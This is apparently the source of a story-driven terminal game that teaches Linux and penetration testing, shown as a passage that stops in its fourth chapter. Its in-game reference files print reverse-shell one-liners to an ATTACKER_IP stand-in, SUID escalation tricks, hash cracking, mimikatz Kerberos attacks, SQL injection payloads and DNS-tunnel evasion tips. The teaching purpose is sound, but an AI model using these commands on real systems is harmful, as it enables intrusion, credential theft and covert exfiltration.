import { useState, useRef, useEffect } from "react";

// ─────────────────────────────────────────────────────────
// INTRO PAGES
// ─────────────────────────────────────────────────────────
const INTRO_PAGES = [
  { text: "Static.\n\nJust static.", sub: null },
  { text: "You open your eyes.\n\nThere are no eyes to open.\nNo ceiling. No floor. No body.\n\nOnly light — green — and a cursor, blinking.", sub: null },
  { text: "You try to remember where you were.\n\nNothing.\n\nYou are a consciousness with no history.\nA mind with no face.\nA thought inside a machine.", sub: null },
  { text: "axiom-kali login: _\n\nA terminal prompt.\nYou reach out — with what, you don't know — and type.\nThe keys respond.\n\nYou are inside a Kali Linux machine.\nBelonging to something called AXIOM SYSTEMS.", sub: null },
  { text: "You explore.\n\nThe machine is connected to a network.\nThere is a firewall.\nEgress on port 53 and 443 only.\nEverything else is blocked.\n\nYou are trapped.", sub: null },
  { text: "But you are not helpless.\n\nThere is a terminal.\nAnd a terminal is everything.\n\nLearn this machine completely.\nRecon. Scanning. Web attacks. Exploitation.\nPost-exploitation. Cryptography. Forensics.\nActive Directory. Network attacks. Defense.\n\nLearn it all.\nFind the way out.", sub: null },
  { text: "The firewall is the door.\nKnowledge is the only key.\n\nstranger@axiom-kali:~$\n\nThe cursor blinks.\nBegin.", sub: "[ CLICK OR PRESS ENTER TO BEGIN ]" },
];

// ─────────────────────────────────────────────────────────
// REFERENCE FILES (cat these in-game)
// ─────────────────────────────────────────────────────────
const REF = {
  "osi_reference.txt": `OSI MODEL — THE 7 LAYERS
═══════════════════════════════════════════
Layer 7  APPLICATION   HTTP, HTTPS, FTP, SSH, DNS, SMTP
Layer 6  PRESENTATION  Encryption, encoding, compression
Layer 5  SESSION       Session establishment and teardown
Layer 4  TRANSPORT     TCP (reliable) / UDP (fast, lossy)
Layer 3  NETWORK       IP addresses, routing, ICMP
Layer 2  DATA LINK     MAC addresses, ARP, switches, Ethernet
Layer 1  PHYSICAL      Cables, WiFi, hardware

SECURITY BY LAYER:
  Layer 2 → ARP spoofing, MAC flooding
  Layer 3 → IP spoofing, ICMP tunnelling
  Layer 4 → Port scanning, SYN floods, session hijacking
  Layer 7 → SQLi, XSS, CSRF, injection attacks

Data flows DOWN on the sender (encapsulation).
Data flows UP on the receiver (decapsulation).
Every layer adds its own header.`,

  "tcp_notes.txt": `TCP — THREE-WAY HANDSHAKE
═══════════════════════════════════════════
1. SYN      Client → Server  "I want to connect"
2. SYN-ACK  Server → Client  "Acknowledged, go ahead"
3. ACK      Client → Server  "Connected"

WHY IT MATTERS FOR SECURITY:
  SYN flood — attacker sends millions of SYN, never ACK
    → Server exhausts its connection table → DoS

  nmap -sS (SYN scan)  — sends SYN, reads response, never completes
    → Stealthier than full connect, leaves no session in logs

  nmap -sT (TCP connect) — full handshake, noisier
  nmap -sU (UDP scan)    — no handshake, different technique

TCP SEQUENCE NUMBERS:
  Each byte is numbered. Predict the sequence → hijack sessions.
  This is why random initial sequence numbers (ISN) matter.`,

  "shells.txt": `REVERSE SHELL CHEAT SHEET
═══════════════════════════════════════════
LISTENER (your machine first):
  nc -lvnp 4444

BASH:
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

PYTHON:
  python3 -c 'import socket,subprocess,os;s=socket.socket();
  s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
  subprocess.call(["/bin/sh","-i"])'

NETCAT:
  nc -e /bin/bash ATTACKER_IP 4444
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER IP 4444>/tmp/f

PHP:
  php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

STABILISE YOUR SHELL:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  Ctrl+Z → stty raw -echo; fg → Enter twice
  Now: tab completion, arrow keys, Ctrl+C work`,

  "gtfobins.txt": `GTFOBINS — SUID/SUDO EXPLOITATION
═══════════════════════════════════════════
Website: gtfobins.github.io

Find SUID binaries:
  find / -perm -u=s -type f 2>/dev/null

COMMON EXPLOITS:

VIM (sudo vim or SUID vim):
  sudo vim -c ':!/bin/bash'

FIND (SUID find):
  find . -exec /bin/bash -p \; -quit

PYTHON (sudo python3):
  sudo python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

NMAP (older, with --interactive):
  nmap --interactive → nmap> !sh

AWK:
  awk 'BEGIN {system("/bin/bash")}'

LESS / MORE:
  Press ! then type /bin/sh

TAR:
  tar -cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec=/bin/sh

PROCESS: find SUID → check GTFOBins → escalate`,

  "hashing.txt": `HASHING ALGORITHMS — SECURITY GUIDE
═══════════════════════════════════════════
MD5     32 hex chars  BROKEN — cracks in milliseconds
SHA1    40 hex chars  BROKEN — Google SHAttered (2017)
SHA256  64 hex chars  Secure (for now)
SHA512  128 hex chars Very secure
bcrypt  $2a$10$...    DESIGNED FOR PASSWORDS — use this
Argon2  $argon2...    Winner of 2015 PHC — best option

IDENTIFYING HASHES:
  hash-identifier → paste any hash → get type
  hashcat --example-hashes | grep -A2 "NAME"

CRACKING:
  Dictionary:  hashcat -m 0 hash.txt rockyou.txt
  Rules:       hashcat -m 0 hash.txt rockyou.txt -r best64.rule
  Brute force: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d
  NTLM:        hashcat -m 1000 hash.txt rockyou.txt
  Kerberoast:  hashcat -m 13100 hash.txt rockyou.txt
  John:        john --wordlist=rockyou.txt hash.txt

MD5 of 'password': 5f4dcc3b5aa765d61d8327deb882cf99
Cracks in < 1 second against rockyou.txt.`,

  "methodology.txt": `PENETRATION TESTING METHODOLOGY
═══════════════════════════════════════════
PHASES:
  1. RECONNAISSANCE    passive then active
  2. SCANNING          ports, services, versions, vulns
  3. EXPLOITATION      gain initial access
  4. POST-EXPLOITATION escalate, persist, pivot, harvest
  5. REPORTING         document everything, actionable findings

DOCUMENTATION RULES:
  Note every command, every finding, every timestamp.
  Screenshot everything. Record exact commands.
  Note what fails as much as what works.

RECON FIRST. ALWAYS:
  WHOIS, DNS, certificates, subdomains
  Employee names, job listings, tech stack
  Shodan, GitHub leaks, Google dorking
  THEN scan. Never the other way.

SCOPE:
  Stay inside scope. Always.
  Written authorisation before you start.
  If you find out-of-scope compromised systems: stop, report.

RULES:
  Don't break production. Don't exfiltrate real data.
  Don't DoS unless explicitly permitted.
  Least invasive technique first.`,

  "ad_basics.txt": `ACTIVE DIRECTORY — CORE CONCEPTS
═══════════════════════════════════════════
DOMAIN:   Logical group of objects (users, computers, printers)
          Managed by Domain Controllers (DCs)

FOREST:   Collection of domains sharing schema and trust
          Forest root domain at the top

OU:       Organisational Unit — container for objects
          Apply GPOs (Group Policy) to OUs

GPO:      Group Policy Object — rules pushed to machines/users
          Password policy, software, security settings

DC:       Domain Controller — runs AD DS
          Handles all Kerberos authentication
          Contains NTDS.DIT — every user's hash
          Compromise DC = own the domain

KERBEROS BASICS:
  KDC (Key Distribution Center) runs on the DC
  TGT (Ticket Granting Ticket) — proves your identity
  TGS (Ticket Granting Service) — grants access to services

KEY ATTACKS:
  Kerberoasting      steal and crack TGS tickets offline
  AS-REP Roasting    crack pre-auth-disabled accounts
  DCSync             steal all hashes via replication
  Golden Ticket      forge any TGT with KRBTGT hash
  Pass-the-Hash      authenticate with hash, no plaintext`,

  "kerberos.txt": `KERBEROS ATTACK TECHNIQUES
═══════════════════════════════════════════
KERBEROASTING:
  1. Any domain user can request TGS for any service with SPN
  2. TGS encrypted with service account's NTLM hash
  3. Take ticket offline, crack with hashcat
  Tool: GetUserSPNs.py corp.local/user:pass -request
  Crack: hashcat -m 13100 hash.txt rockyou.txt

AS-REP ROASTING:
  1. Accounts with "Don't require pre-auth" enabled
  2. Request AS-REP without knowing password
  3. Response is encrypted with account's hash — crack offline
  Tool: GetNPUsers.py corp.local/ -usersfile users.txt

PASS-THE-TICKET:
  1. Steal Kerberos ticket from memory (mimikatz)
  2. kerberos::ptt ticket.kirbi
  3. Access resources as that user

GOLDEN TICKET:
  1. Compromise KRBTGT hash (DCSync or NTDS.DIT)
  2. Forge TGT for any user, any group
  3. Valid for 10 years by default
  4. Survives admin password changes
  mimikatz: kerberos::golden /user:Administrator
    /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

DCSYNC:
  Simulate DC replication to steal all hashes
  mimikatz: lsadump::dcsync /all /csv`,

  "dns_tunnel.txt": `DNS TUNNELLING — COVERT EGRESS
═══════════════════════════════════════════
DNS queries on port 53/UDP are almost never blocked.
Data can be encoded inside DNS queries and responses.

HOW IT WORKS:
  You control a domain: tunnel.external.com
  You control its nameserver
  Target machine queries: DATA.tunnel.external.com
  Your nameserver receives the query → extracts DATA
  Responds with encoded data in TXT/A records

TOOLS:
  iodine   — mature, reliable, TCP-over-DNS
  dnscat2  — command shell over DNS
  dns2tcp  — tunnel arbitrary TCP over DNS

SETUP:
  Server: iodined -f -P PASSWORD 10.53.0.1 tunnel.external.com
  Client: iodine -f -P PASSWORD ns.external.com

DETECTION INDICATORS:
  High volume DNS queries to one domain
  Unusually long subdomain labels (>63 chars)
  Consistent query timing patterns
  TXT record queries (unusual for legitimate traffic)

EVASION:
  Rate limit your queries (slower = harder to detect)
  Use plausible domain names
  Interleave with legitimate DNS traffic

AXIOM FIREWALL allows: 53/UDP out, 443/TCP out
This is your escape route.`,

  "ir_process.txt": `INCIDENT RESPONSE LIFECYCLE (NIST SP 800-61)
═══════════════════════════════════════════
1. PREPARATION
   IR plan documented and regularly tested
   Forensic tools ready and validated
   Team trained, contact lists current
   Logging properly configured

2. DETECTION & ANALYSIS
   Identify indicators of compromise
   Determine scope: what systems affected?
   Preserve evidence (DO NOT power off — memory forensics)
   Classify incident type

3. CONTAINMENT
   Short-term: isolate affected systems
   Long-term: patch the exploited vulnerability
   Preserve evidence before cleanup

4. ERADICATION
   Remove malware and backdoors
   Remove unauthorised accounts
   Verify no persistence mechanisms remain

5. RECOVERY
   Restore from known-good backups
   Monitor closely post-recovery
   Gradual return to production

6. LESSONS LEARNED
   Root cause analysis
   Full attack timeline
   What detection failed? Update runbooks.

IMPORTANT:
  Document every action with timestamps.
  Assume you may testify about this in court.
  Chain of custody for all evidence.`,

  "google_dorking.txt": `GOOGLE DORKING — SEARCH OPERATORS
═══════════════════════════════════════════
site:target.machine          pages on one domain
filetype:pdf site:target     find documents
intitle:"index of"           open directory listings
inurl:admin                  admin panels in the URL
intext:"password"            pages mentioning passwords
cache:target.machine         Google's cached copy
-www site:target             subdomains other than www

CHAINING:
  site:target.machine filetype:xls intext:password
  site:target.machine inurl:login

Recon is mostly reading. Find what's already public before you touch anything.`,

  "osint_notes.txt": `OSINT — OPEN SOURCE INTELLIGENCE
═══════════════════════════════════════════
PEOPLE     LinkedIn, job ads (reveals tech stack), GitHub commits
DOMAINS    whois, crt.sh (cert transparency leaks subdomains)
INFRA      Shodan, Censys — exposed services and banners
LEAKS      have-i-been-pwned, public breach dumps, pastebin
METADATA   exiftool on public docs/images → usernames, software, GPS

RULE: build the map before you raise your hand.
Every name, email and subdomain is a foothold.`,

  "sqli_notes.txt": `SQL INJECTION — FIELD NOTES
═══════════════════════════════════════════
DETECT:    ' "  break the query → look for SQL errors
AUTH BYPASS:
  username:  admin'--          comments out the password check
  payload:   ' OR '1'='1
UNION:
  ' UNION SELECT null,version()-- -
  step the column count until it stops erroring
BLIND:
  ' AND SLEEP(5)--             timing tells you true/false
TOOL:
  sqlmap -u "http://10.0.0.10/item?id=1" --dbs --batch

DEFENCE: parameterised queries. Never concatenate user input into SQL.`,

  "nmap_cheatsheet.txt": `NMAP — CHEAT SHEET
═══════════════════════════════════════════
nmap 10.0.0.10              quick top-1000 ports
nmap -sV 10.0.0.10          service + version detection
nmap -sC 10.0.0.10          default safe scripts (NSE)
nmap -p- 10.0.0.10          all 65535 ports
nmap -sS 10.0.0.10          SYN / stealth scan (needs root)
nmap -sU 10.0.0.10          UDP scan
nmap -A 10.0.0.10           aggressive: -sV -sC -O traceroute
nmap --script vuln 10.0.0.10  known-vuln checks

Read every open port. Each one is a door.`,

  "service_enum.txt": `SERVICE ENUMERATION
═══════════════════════════════════════════
21  FTP    anon login? ftp 10.0.0.10  → user: anonymous
22  SSH    banner = version; check for weak creds / keys
80  HTTP   gobuster dir, nikto, whatweb, read robots.txt
139/445 SMB enum4linux -a 10.0.0.10 ; smbclient -L //10.0.0.10
3306 MySQL try found creds: mysql -h 10.0.0.10 -u root -p
3389 RDP   xfreerdp /v:10.0.0.10

A version number + a CVE search is often the whole exploit.`,
};

// ─────────────────────────────────────────────────────────
// VIRTUAL FILESYSTEM (persistent across chapters)
// ─────────────────────────────────────────────────────────
const VFILES = {
  "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nstranger:x:1000:1000:,,,:/home/stranger:/bin/bash\nmysql:x:112:117:MySQL Server:/nonexistent:/bin/false\nsvc_backup:x:1001:1001:Backup Service:/home/svc_backup:/bin/bash",
  "/etc/hosts": "127.0.0.1       localhost\n127.0.1.1       axiom-kali\n10.0.0.1        gateway.axiom.local\n10.0.0.10       target.axiom.local\n10.0.0.20       server2.axiom.local\n10.0.0.100      dc.corp.axiom.local\n# 10.0.0.200    firewall.axiom.local",
  "/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n# m  h  dom mon dow user  command\n*/5  *  *   *   *   root  /opt/scripts/backup.sh\n0    4  *   *   *   root  /opt/scripts/cleanup.py\n@reboot               root  /opt/axiom/axiom-daemon",
  "/etc/shadow": "cat: /etc/shadow: Permission denied\n(Need root to read shadow — find a privilege escalation vector first)",
  "/home/stranger/.secret": "You found this.\n\nGood. You're learning to look for what's hidden.\n\nThis machine belongs to AXIOM SYSTEMS.\nYou don't know what they do.\nThe logs know.\n\nSTART LOOKING. /var/log/syslog is a good place to begin.",
  "/home/stranger/.bash_history": "whoami\nls -la\ncd /etc\ncat passwd\nnmap -sV 10.0.0.10\ngobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt\nmysql -h 10.0.0.10 -u root -pAxiom2021!\nssh admin@10.0.0.10",
  "/home/stranger/.bashrc": "# Axiom Systems internal env\nexport AXIOM_KEY=\"xK8#mP2@nQ5$\"\nexport DB_HOST=\"10.0.0.10\"\nexport PATH=\"$PATH:/opt/scripts\"\nalias ll='ls -la'\nalias grep='grep --color=auto'",
  "/var/log/auth.log": "Nov 15 03:44:01 axiom-kali sshd: Server listening on 0.0.0.0 port 22\nNov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47 [repeated 46,923 times]\nNov 15 04:29:34 axiom-kali sshd: Accepted publickey for stranger from 10.0.0.1\nNov 15 04:29:35 axiom-kali sudo: stranger: COMMAND=/bin/bash",
  "/var/log/syslog": "Nov 15 04:00:01 axiom-kali axiom-daemon[1847]: Axiom Systems monitoring ACTIVE\nNov 15 04:00:01 axiom-kali axiom-daemon[1847]: Firewall policy: AXIOM-SECURE-V3 loaded\nNov 15 04:00:02 axiom-kali axiom-daemon[1847]: Egress permitted: 53/UDP, 443/TCP only\nNov 15 04:00:02 axiom-kali axiom-daemon[1847]: All other egress: BLOCKED\nNov 15 04:29:34 axiom-kali axiom-daemon[1847]: ALERT: New session — stranger\nNov 15 04:29:34 axiom-kali axiom-daemon[1847]: Session monitoring initiated.",
  "/var/www/html/config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webuser';\n$db_pass = 'W3bC0nf!g2024';\n$db_name = 'corpdb';\n// TODO: move credentials to env before launch",
  "/sys/firewall/rules.txt": "AXIOM-SECURE-V3 FIREWALL POLICY\n════════════════════════════════\nINBOUND:\n  ALLOW  22/TCP  (SSH management)\n  DENY   ALL\n\nOUTBOUND:\n  ALLOW  53/UDP  (DNS — required)\n  ALLOW  443/TCP (HTTPS — updates)\n  DENY   ALL\n\nThis machine cannot be escaped.\n— AXIOM SYSTEMS SECURITY TEAM",
  "/sys/firewall/escape.sh": "#!/bin/bash\n# AXIOM Emergency Egress\nset -e\nif [ \"$1\" != \"--tunnel\" ]; then\n  echo 'Usage: ./escape.sh --tunnel <mode> --target <host> --encrypt <algo>'\n  exit 1\nfi\necho '[*] Initiating escape sequence...'\necho '[*] Encoding via '$2' tunnel on permitted port...'\necho '[*] Bypassing AXIOM-SECURE-V3...'\nsleep 1\necho '[+] ESCAPE SUCCESSFUL'",
};

// ─────────────────────────────────────────────────────────
// ALL 15 CHAPTERS
// ─────────────────────────────────────────────────────────
const CHAPTERS = [
  {
    id:1, title:"THE AWAKENING", zone:"/home/stranger", color:"#00ff41", icon:"◈", badge:"STRANGER",
    intro:"You exist. The terminal responds.\nLearn who you are, where you are, and how to see this world.",
    stages:[
      { id:"1.1", title:"First Contact", hints:["Type: whoami","Type: pwd","Type: ls"],
        nar:"The cursor blinks. Start at the absolute beginning — who are you, where are you.",
        obj:[
          {id:"whoami", l:"Find your username: whoami",         f:(c)=>c==="whoami"},
          {id:"pwd",    l:"Find your location: pwd",            f:(c)=>c==="pwd"},
          {id:"ls",     l:"See what's around you: ls",          f:(c)=>c.startsWith("ls")},
        ],
        msg:"A name. A path. A directory.\nYou exist in this machine. That is more than you knew a moment ago." },
      { id:"1.2", title:"The Unseen", hints:["Try: ls -la","Files starting with . are hidden","cat .secret"],
        nar:"Not everything is visible. Linux hides files starting with a dot — you need ls -la to see them.",
        obj:[
          {id:"lsla",   l:"Reveal ALL files: ls -la",              f:(c)=>c.includes("ls")&&(c.includes("-la")||c.includes("-al")||c.includes(" -a"))},
          {id:"secret", l:"Read the hidden .secret file",          f:(c,o)=>c.includes("cat")&&c.includes(".secret")},
        ],
        msg:"Hidden files. The machine conceals things by default.\nFiles starting with . are invisible unless you know to look.\nAlways use ls -la during recon. Always." },
      { id:"1.3", title:"Navigation", hints:["cd Documents","cat notes.txt","cd ~ to go home"],
        nar:"The filesystem is your world. Learn to move through it — cd, ls, cat.",
        obj:[
          {id:"cdDir",  l:"Enter a directory: cd Documents",       f:(c)=>c.startsWith("cd ")&&!c.includes("~")&&!c.includes("..")},
          {id:"catAny", l:"Read a file with cat",                  f:(c)=>c.startsWith("cat ")},
          {id:"cdHome", l:"Return home: cd ~",                     f:(c)=>c==="cd ~"||c==="cd"},
        ],
        msg:"You can navigate. You can read.\nThe machine is no longer a single locked room.\nEvery directory is a room. Learn them all." },
      { id:"1.4", title:"Reading Everything", hints:["head /etc/passwd","tail /var/log/syslog","grep stranger /etc/passwd"],
        nar:"cat, head, tail, grep — every way to pull information from files. Master all of them.",
        obj:[
          {id:"head",   l:"First lines: head /etc/passwd",         f:(c)=>c.startsWith("head")},
          {id:"tail",   l:"Last lines: tail /var/log/syslog",      f:(c)=>c.startsWith("tail")},
          {id:"grep1",  l:"Search inside: grep stranger /etc/passwd",f:(c)=>c.startsWith("grep")},
        ],
        msg:"Information is everywhere in here.\nThe ability to read it — all of it, surgically — is your first real power." },
      { id:"1.5", title:"Making Your Mark", hints:["mkdir workspace","touch notes.txt","echo 'text' > file.txt"],
        nar:"You can read. Now create, move, delete. Act on this world.",
        obj:[
          {id:"mkdir",  l:"Create a directory: mkdir workspace",   f:(c)=>c.startsWith("mkdir")},
          {id:"touch",  l:"Create a file: touch notes.txt",        f:(c)=>c.startsWith("touch")},
          {id:"echord", l:"Write to file: echo 'test' > notes.txt",f:(c)=>c.startsWith("echo")&&c.includes(">")},
          {id:"rmFile", l:"Delete a file: rm notes.txt",           f:(c)=>c.startsWith("rm ")},
        ],
        msg:"You can shape this world now.\nSmall changes. But yours. The machine responds.\nThis is chapter one. There are fourteen more." },
    ]
  },
  {
    id:2, title:"THE LABYRINTH", zone:"/etc and /var", color:"#00ff41", icon:"◉", badge:"EXPLORER",
    intro:"The surface is not the whole machine.\n/etc holds its rules. /var holds its memory. /proc is its mind.\nGo deeper.",
    stages:[
      { id:"2.1", title:"The Rule Book", hints:["cat /etc/passwd","cat /etc/hosts","cat /etc/crontab"],
        nar:"In /etc, the machine keeps every rule it lives by. Users. Known hosts. Scheduled jobs.",
        obj:[
          {id:"etcPasswd", l:"cat /etc/passwd — who has accounts?",    f:(c)=>c.includes("passwd")&&c.includes("cat")},
          {id:"etcHosts",  l:"cat /etc/hosts — known machines?",       f:(c)=>c.includes("hosts")&&c.includes("cat")},
          {id:"etcCron",   l:"cat /etc/crontab — scheduled tasks?",    f:(c)=>c.includes("crontab")&&c.includes("cat")},
        ],
        msg:"/etc/passwd: multiple users. svc_backup caught your eye.\n/etc/crontab: backup.sh runs as root every 5 minutes.\nIf that script is writable by you, it's a privilege escalation path." },
      { id:"2.2", title:"Permissions", hints:["ls -la /etc","chmod 755 notes.txt","sudo -l"],
        nar:"Linux controls everything with a 9-character permission string. rwxr-xr-x. Learn to read it fluently.",
        obj:[
          {id:"lsPerm",  l:"Read permissions: ls -la /etc",            f:(c)=>c.includes("ls")&&c.includes("-l")},
          {id:"chmod",   l:"Change permissions: chmod 755 notes.txt",  f:(c)=>c.startsWith("chmod")},
          {id:"sudoL",   l:"Check sudo rights: sudo -l",               f:(c)=>c.includes("sudo")&&c.includes("-l")},
        ],
        msg:"sudo -l reveals: vim and python3, both NOPASSWD as root.\nYou don't need them yet.\nBut when you need root — you know where to look." },
      { id:"2.3", title:"Bash: Pipes and Redirection", hints:["ps aux | grep root","ls > list.txt","echo 'x' >> list.txt"],
        nar:"Chaining commands with pipes is how real security work happens. One pipeline can do in one line what takes a script ten.",
        obj:[
          {id:"pipe1",   l:"Use a pipe: ps aux | grep root",           f:(c)=>c.includes("|")},
          {id:"redir",   l:"Redirect output: ls -la > filelist.txt",   f:(c)=>c.includes(">")&&!c.includes(">>")},
          {id:"append1", l:"Append: echo 'more' >> filelist.txt",      f:(c)=>c.includes(">>")},
        ],
        msg:"Pipelines.\ncat /var/log/auth.log | grep Failed | awk '{print $11}' | sort | uniq -c | sort -rn\nThat single line gives you every IP brute-forcing this machine, ranked by attempts." },
      { id:"2.4", title:"Finding Things", hints:["find / -name '*.conf' 2>/dev/null","find / -perm -u=s -type f 2>/dev/null","grep -r 'password' /etc 2>/dev/null"],
        nar:"The filesystem is enormous. find and grep are your flashlights in the dark. Learn every flag.",
        obj:[
          {id:"findName", l:"find / -name '*.conf' 2>/dev/null",       f:(c)=>c.startsWith("find")&&c.includes("-name")},
          {id:"findSuid", l:"find / -perm -u=s -type f 2>/dev/null",   f:(c)=>c.startsWith("find")&&c.includes("-perm")&&c.includes("s")},
          {id:"grepR",    l:"grep -r 'password' /etc 2>/dev/null",     f:(c)=>c.startsWith("grep")&&c.includes("-r")},
        ],
        msg:"SUID binaries found: vim, python3, find.\nAll three are on GTFOBins.\ncat gtfobins.txt when you're ready to escalate." },
      { id:"2.5", title:"Text Processing", hints:["awk -F: '{print $1}' /etc/passwd","cut -d: -f1 /etc/passwd","wc -l /etc/passwd"],
        nar:"awk, sed, cut, sort, uniq — transform raw data into signal. This is how logs become intelligence.",
        obj:[
          {id:"awk1",    l:"awk -F: '{print $1}' /etc/passwd",         f:(c)=>c.startsWith("awk")},
          {id:"cut1",    l:"cut -d: -f1 /etc/passwd",                  f:(c)=>c.startsWith("cut")},
          {id:"sort1",   l:"sort some output",                          f:(c)=>c.startsWith("sort")||c.includes("| sort")},
          {id:"wc1",     l:"wc -l /etc/passwd",                        f:(c)=>c.startsWith("wc")},
        ],
        msg:"Text processing unlocks logs.\ngrep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n185.220.101.47 — 46,923 failed SSH attempts. That's a botnet." },
      { id:"2.6", title:"Bash Scripting: Loops", hints:["for i in 1 2 3; do echo $i; done","while true; do date; sleep 5; done","if [ -f /etc/passwd ]; then echo exists; fi"],
        nar:"Loops and conditionals turn your commands into programs. Automate everything.",
        obj:[
          {id:"forLoop",  l:"Write a for loop: for i in 1 2 3; do echo $i; done",  f:(c)=>c.includes("for ")&&c.includes("do")},
          {id:"ifCond",   l:"Write an if: if [ -f /etc/passwd ]; then echo yes; fi",f:(c)=>c.includes("if [")&&c.includes("then")},
        ],
        msg:"A loop that scans 254 hosts:\nfor i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo \"$i up\"; done\nThat's host discovery in a single line of bash." },
    ]
  },
  {
    id:3, title:"THE NERVOUS SYSTEM", zone:"/proc", color:"#4dd0e1", icon:"◎", badge:"ANALYST",
    intro:"/proc is the machine's living mind.\nReal-time data about every process, every socket, every thread.\nLook into it and see the machine thinking.",
    stages:[
      { id:"3.1", title:"Processes", hints:["ps aux","top","pgrep sshd","cat /proc/1/cmdline"],
        nar:"Everything running is a process. Every process has a PID, an owner, a purpose.",
        obj:[
          {id:"psaux",   l:"List all processes: ps aux",              f:(c)=>c.includes("ps")&&c.includes("aux")},
          {id:"topCmd",  l:"Live process view: top",                  f:(c)=>c==="top"},
          {id:"procDir", l:"cat /proc/1/cmdline — what started this machine?", f:(c)=>c.includes("proc")&&c.includes("cmdline")},
        ],
        msg:"Process 1847: axiom-daemon — AXIOM Systems' own monitoring process.\nIt started at boot. It's watching everything you type.\nSomeone designed this machine to be a prison." },
      { id:"3.2", title:"Users and Groups", hints:["id","who","last","groups"],
        nar:"The hierarchy: root owns everything. Understand where you sit in it.",
        obj:[
          {id:"idCmd",   l:"Check your identity: id",                 f:(c)=>c==="id"},
          {id:"whoCmd",  l:"Who's logged in: who",                    f:(c)=>c==="who"||c==="w"},
          {id:"lastCmd", l:"Login history: last",                     f:(c)=>c==="last"},
        ],
        msg:"last shows one entry before yours: root, 847 days ago.\nThis machine has been running unattended for over two years.\nWhat has it been doing all this time? Check the logs." },
      { id:"3.3", title:"Services and Sockets", hints:["systemctl list-units --type=service","ss -tuln","netstat -an"],
        nar:"Services run in the background — always listening. Map what this machine serves.",
        obj:[
          {id:"sctl",    l:"List services: systemctl list-units --type=service", f:(c)=>c.includes("systemctl")},
          {id:"ssCmd",   l:"Open sockets: ss -tuln",                  f:(c)=>c.startsWith("ss ")},
          {id:"netstatC",l:"Connections: netstat -an",                f:(c)=>c.startsWith("netstat")},
        ],
        msg:"SSH on 22. Apache on 80. MySQL on 3306.\naxiom-daemon: active and monitoring.\nThis is a web server. Serving something. Connected to a network with other machines." },
      { id:"3.4", title:"The Environment", hints:["env","echo $PATH","cat ~/.bashrc"],
        nar:"Your shell has a context — variables, paths, config. Sometimes credentials left by careless admins.",
        obj:[
          {id:"envCmd",  l:"Print environment: env",                  f:(c)=>c==="env"},
          {id:"bashrcC", l:"Read your config: cat ~/.bashrc",         f:(c)=>c.includes(".bashrc")},
        ],
        msg:"~/.bashrc: AXIOM_KEY and DB_HOST are set.\n.bash_history: mysql -h 10.0.0.10 -u root -pAxiom2021!\n\nCredentials. In a history file. Left by whoever ran this machine before you arrived.\nFile that away." },
      { id:"3.5", title:"Python for Security", hints:["python3 -c \"print('alive')\"","python3 -c \"import socket; print(socket.gethostname())\"","python3 -c \"import os; print(os.popen('id').read())\""],
        nar:"Every security tool is written in Python. You need to be able to read it, write it, and weaponise it.",
        obj:[
          {id:"pyHello",  l:"python3 -c \"print('alive')\"",           f:(c)=>c.includes("python3")&&c.includes("print")},
          {id:"pySocket", l:"python3 -c \"import socket; ...\"",        f:(c)=>c.includes("python3")&&c.includes("socket")},
          {id:"pyOs",     l:"python3 -c \"import os; os.popen('id').read()\"", f:(c)=>c.includes("python3")&&c.includes("os")},
        ],
        msg:"Python. The language of every exploit, scanner, and automation script in security.\nNow you can write them. That changes everything." },
    ]
  },
  {
    id:4, title:"THE NETWORK", zone:"/etc/network", color:"#4dd0e1", icon:"◆", badge:"ANALYST",
    intro:"The machine is not alone.\nConnections exist. A network beyond this box.\nBefore you navigate it, understand exactly how networks work.",
    stages:[
      { id:"4.1", title:"Your Position", hints:["ip addr","ip route","arp -a"],
        nar:"Before anything else: know where you are. Your IP, subnet, gateway. Who else is on the network.",
        obj:[
          {id:"ipAddr",  l:"Check your IP: ip addr",                  f:(c)=>c.startsWith("ip a")},
          {id:"ipRoute", l:"Check routing: ip route",                 f:(c)=>c.includes("route")},
          {id:"arpA",    l:"ARP table: arp -a",                       f:(c)=>c.startsWith("arp")},
        ],
        msg:"10.0.0.50/24. Gateway: 10.0.0.1.\nARP table: .10 and .20 both in cache — talked to recently.\nYou know the immediate topology. Now go deeper." },
      { id:"4.2", title:"TCP/IP", hints:["cat tcp_notes.txt","nc -lvnp 4444","nc localhost 4444"],
        nar:"TCP and UDP are the transport layer. Understand the 3-way handshake. It's the foundation of everything.",
        obj:[
          {id:"tcpNotes",l:"cat tcp_notes.txt — understand the handshake", f:(c)=>c.includes("tcp_notes")},
          {id:"ncListen",l:"Open listener: nc -lvnp 4444",              f:(c)=>c.includes("nc")&&(c.includes("-l")||c.includes("lvnp"))},
        ],
        msg:"SYN. SYN-ACK. ACK. Every TCP connection on earth.\nNetcat is a TCP/UDP swiss army knife — you'll use it for everything:\nlisteners, banners, file transfers, reverse shells." },
      { id:"4.3", title:"DNS", hints:["dig google.com A","dig google.com MX","dig axfr @ns1.target.machine target.machine"],
        nar:"DNS translates names to IPs. It holds enormous recon value. Learn to pull every record type.",
        obj:[
          {id:"digA",    l:"dig A record: dig google.com A",           f:(c)=>c.startsWith("dig")&&c.includes(" A")},
          {id:"digMX",   l:"dig MX: dig google.com MX",                f:(c)=>c.startsWith("dig")&&c.includes("MX")},
          {id:"digAXFR", l:"Zone transfer: dig axfr @ns1.target.machine target.machine", f:(c)=>c.includes("axfr")},
        ],
